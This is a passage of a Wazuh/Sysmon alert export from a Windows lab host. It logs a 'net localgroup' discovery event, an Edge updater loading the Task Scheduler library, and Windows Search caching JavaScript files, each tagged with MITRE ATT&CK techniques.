ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:40:24.2474304Z,8421,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,26,FALSE,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031,windows_eventchannel,log,"Dec 10, 2024 @ 17:40:24.976",EventChannel,1733852424,"Dec 10, 2024 @ 17:40:24.976", , , , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7d08-6758-f101-000000000300},7724,40:24.2,"SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , , , , , , , , , ,{15959494-7d08-6758-f001-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\WINDOWS\\system32\\net.exe\"" localgroup",0xeacdd,8584,C:\\Users\\mari\\,C:\\Windows\\System32\\net.exe,C:\\WINDOWS\\system32\\net1 localgroup,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,WvRRspMBtNh2X6vnUN_x,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:40:25.006
ProcessGuid: {15959494-7d08-6758-f201-000000000300}
ProcessId: 1808
Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
ImageLoaded: C:\Windows\SysWOW64\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=C94CEC3A6F102EF38EB1D913D61A03B2100983FE,MD5=FF11E73B7D8A3A0822E95DD68DA10B13,SHA256=0F15534DC00A65E980CAA2E11F5D5251518D528F2F28165E9881B598BF64BDD1,IMPHASH=59BF7D0FAD0B5B7F706EA9250167BD5B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:40:25.0215350Z,8425,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,15,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:40:25.039",EventChannel,1733852425,"Dec 10, 2024 @ 17:40:25.039", , , , , ,taskschd.dll,C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\SysWOW64\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7d08-6758-f201-000000000300},1808,40:25.0,"SHA1=C94CEC3A6F102EF38EB1D913D61A03B2100983FE,MD5=FF11E73B7D8A3A0822E95DD68DA10B13,SHA256=0F15534DC00A65E980CAA2E11F5D5251518D528F2F28165E9881B598BF64BDD1,IMPHASH=59BF7D0FAD0B5B7F706EA9250167BD5B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,ZfRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:05.666
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\6IYNEI2H\libs_svg-react_dist_SvgList_js.c68e8b9c0f267dc55338[1].js
CreationUtcTime: 2024-12-10 17:41:05.666
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:05.6742356Z,8492,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,36,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:06.292",EventChannel,1733852466,"Dec 10, 2024 @ 17:41:06.292", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:05.7, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\6IYNEI2H\\libs_svg-react_dist_SvgList_js.c68e8b9c0f267dc55338[1].js,41:05.7, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,Z_RRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:05.869
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\76M51ZML\experiences_windows-shell-content-preview_dist_WindowsShellContentPreview_constants_js-experi-3c43a7.b6d28d485e02104f607a[1].js
CreationUtcTime: 2024-12-10 17:41:05.869
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:05.8753079Z,8494,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,38,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:06.323",EventChannel,1733852466,"Dec 10, 2024 @ 17:41:06.323", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:05.9, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\76M51ZML\\experiences_windows-shell-content-preview_dist_WindowsShellContentPreview_constants_js-experi-3c43a7.b6d28d485e02104f607a[1].js,41:05.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,avRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:06.025
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\content-preview.5fb37f9b84e950c8cfd2[1].js
CreationUtcTime: 2024-12-10 17:41:06.025
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:06.0429654Z,8497,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,41,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:06.370",EventChannel,1733852466,"Dec 10, 2024 @ 17:41:06.370", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:06.0, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\content-preview.5fb37f9b84e950c8cfd2[1].js,41:06.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,b_RRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:06.322
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\76M51ZML\weather-common.dcf196507ec95a487567[1].js
CreationUtcTime: 2024-12-10 17:41:06.322
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:06.3292578Z,8502,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,46,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:06.448",EventChannel,1733852466,"Dec 10, 2024 @ 17:41:06.448", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:06.3, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\76M51ZML\\weather-common.dcf196507ec95a487567[1].js,41:06.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,cPRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:06.588
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\76M51ZML\weather-info-card.7e2b92738f281811be81[1].js
CreationUtcTime: 2024-12-10 17:41:06.588
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:06.5927528Z,8503,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,47,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:07.357",EventChannel,1733852467,"Dec 10, 2024 @ 17:41:07.357", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:06.6, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\76M51ZML\\weather-info-card.7e2b92738f281811be81[1].js,41:06.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,cfRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:06.807
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\76M51ZML\header.01231fdc4a9ea2c36f85[1].js
CreationUtcTime: 2024-12-10 17:41:06.807
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:06.8101910Z,8505,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,48,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:07.370",EventChannel,1733852467,"Dec 10, 2024 @ 17:41:07.370", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:06.8, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\76M51ZML\\header.01231fdc4a9ea2c36f85[1].js,41:06.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,c_RRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:06.807
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\76M51ZML\windows-shell-actions.f6da0c356d36ac5f0f39[1].js
CreationUtcTime: 2024-12-10 17:41:06.807
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:06.8102242Z,8506,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,50,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:07.387",EventChannel,1733852467,"Dec 10, 2024 @ 17:41:07.387", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:06.8, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\76M51ZML\\windows-shell-actions.f6da0c356d36ac5f0f39[1].js,41:06.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,d_RRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:07.150
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\rail.6253d868afecffcf22e1[1].js
CreationUtcTime: 2024-12-10 17:41:07.150
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:07.1582828Z,8509,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,54,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:07.448",EventChannel,1733852467,"Dec 10, 2024 @ 17:41:07.448", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:07.1, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\rail.6253d868afecffcf22e1[1].js,41:07.1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,evRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:07.453
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\6IYNEI2H\card-action-dist.18216aa755a90f9f31ef[2].js
CreationUtcTime: 2024-12-10 17:41:07.453
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:07.4560089Z,8513,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,57,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:07.511",EventChannel,1733852467,"Dec 10, 2024 @ 17:41:07.511", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:07.5, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\6IYNEI2H\\card-action-dist.18216aa755a90f9f31ef[2].js,41:07.5, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,ffRRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:07.775
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\9F2F9MHX\card-context-menu.2d399227de85f834d265[1].js
CreationUtcTime: 2024-12-10 17:41:07.775
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:07.7778266Z,8516,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,60,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:08.432",EventChannel,1733852468,"Dec 10, 2024 @ 17:41:08.432", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:07.8, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\9F2F9MHX\\card-context-menu.2d399227de85f834d265[1].js,41:07.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,f_RRspMBtNh2X6vnUd9L,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:07.813
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\windows-shell-infopane.e5040d368a40b8e1c749[1].js
CreationUtcTime: 2024-12-10 17:41:07.813
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:07.8247293Z,8518,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,62,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:08.449",EventChannel,1733852468,"Dec 10, 2024 @ 17:41:08.449", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:07.8, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\windows-shell-infopane.e5040d368a40b8e1c749[1].js,41:07.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
